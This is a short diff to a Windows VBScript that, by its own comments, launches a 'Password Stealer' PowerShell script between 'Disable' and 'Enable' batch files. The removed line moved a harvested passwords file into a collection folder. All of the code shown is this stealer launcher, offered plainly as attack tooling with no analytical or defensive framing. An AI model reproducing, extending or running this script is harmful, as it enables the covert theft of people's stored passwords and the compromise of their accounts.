@@ -1,3 +1,4 @@
+
 ''' Loads dependancys
 DIM FSO, MyFile
 Set oShell = CreateObject( "WScript.Shell" )
@@ -13,7 +14,6 @@ CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True
 
 ''' Loads Password Stealer
 CreateObject("Wscript.Shell").Run """Get-Password.ps1""", 1, True
-FSO.MoveFile "Desktop\Passwords.txt\","D:\pass\"
 
 ''' enable movments
 CreateObject("Wscript.Shell").Run """Enable.bat""", 1, True
